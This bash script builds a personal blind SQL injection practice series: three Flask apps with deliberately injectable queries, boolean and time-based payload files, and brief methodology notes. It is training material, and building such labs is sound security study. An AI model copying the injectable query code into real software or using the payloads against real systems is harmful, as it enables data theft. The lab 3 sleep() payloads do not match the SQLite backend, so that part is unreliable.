#!/usr/bin/env bash
set -e

BASE="/home/karime/portswigger_labs/sqli/03-blind-advanced"

echo "[+] Building Blind SQLi Advanced Series..."
echo "    $BASE"

mkdir -p "$BASE"/{01-boolean-engine,02-blind-automation,03-hybrid-blind}
mkdir -p "$BASE"/{01-boolean-engine,02-blind-automation,03-hybrid-blind}/{vuln,exploit,notes,fix,payloads,db}

# =========================================================
# LAB 1 — BOOLEAN EXTRACTION ENGINE
# =========================================================

cat > "$BASE/01-boolean-engine/README.md" << 'EOF'
# LAB 1 — Boolean SQLi Engine

Goal:
Extract data using true/false responses only.
EOF

cat > "$BASE/01-boolean-engine/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/user")
def user():

    username = request.args.get("username", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    query = f"SELECT username FROM users WHERE username = '{username}'"

    try:
        res = cur.execute(query).fetchone()
        return {"exists": bool(res)}
    except:
        return {"exists": False}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/01-boolean-engine/exploit/payloads.txt" << 'EOF'
# TRUE / FALSE inference

' AND 1=1--
' AND 1=2--

# character check

' AND SUBSTR((SELECT username FROM users LIMIT 1),1,1)='a'--

# length check

' AND LENGTH((SELECT username FROM users LIMIT 1))=5--
EOF

cat > "$BASE/01-boolean-engine/notes/methodology.txt" << 'EOF'
BOOLEAN ENGINE:

1. Confirm injection
2. Compare true vs false response
3. Extract character-by-character
EOF


# =========================================================
# LAB 2 — BLIND AUTOMATION ENGINE
# =========================================================

cat > "$BASE/02-blind-automation/README.md" << 'EOF'
# LAB 2 — Blind SQLi Automation Engine
EOF

cat > "$BASE/02-blind-automation/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/check")
def check():

    q = request.args.get("q", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    query = f"SELECT 1 FROM users WHERE username = '{q}'"

    try:
        res = cur.execute(query).fetchone()
        return {"result": bool(res)}
    except:
        return {"result": False}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/02-blind-automation/exploit/payloads.txt" << 'EOF'
# brute character extraction model

' AND SUBSTR((SELECT username FROM users LIMIT 1),{i},1)='{char}'--
EOF

cat > "$BASE/02-blind-automation/notes/methodology.txt" << 'EOF'
AUTOMATION FLOW:

1. loop index i
2. loop charset
3. compare true/false
4. build string incrementally
EOF


# =========================================================
# LAB 3 — HYBRID BLIND (BOOLEAN + TIME)
# =========================================================

cat > "$BASE/03-hybrid-blind/README.md" << 'EOF'
# LAB 3 — Hybrid Blind SQLi

Boolean + Time fallback engine.
EOF

cat > "$BASE/03-hybrid-blind/vuln/app.py" << 'EOF'
from flask import Flask, request
import sqlite3
import time

app = Flask(__name__)

@app.route("/profile")
def profile():

    username = request.args.get("username", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    query = f"SELECT username FROM users WHERE username = '{username}'"

    try:
        cur.execute(query).fetchone()
    except:
        pass

    # artificial delay channel
    time.sleep(0.2)

    return {"status": "ok"}

if __name__ == "__main__":
    app.run(debug=True)
EOF

cat > "$BASE/03-hybrid-blind/exploit/payloads.txt" << 'EOF'
# boolean + time

' AND (CASE WHEN (1=1) THEN sleep(2) ELSE sleep(0) END)--

# character extraction

' AND (CASE WHEN (SUBSTR((SELECT username FROM users LIMIT 1),1,1)='a')
THEN sleep(2) ELSE sleep(0) END)--
EOF

cat > "$BASE/03-hybrid-blind/notes/methodology.txt" << 'EOF'
HYBRID MODEL:

- boolean first
- fallback to time when blocked
- combine both for reliability
EOF


echo "[+] Blind SQLi Advanced Series created successfully"
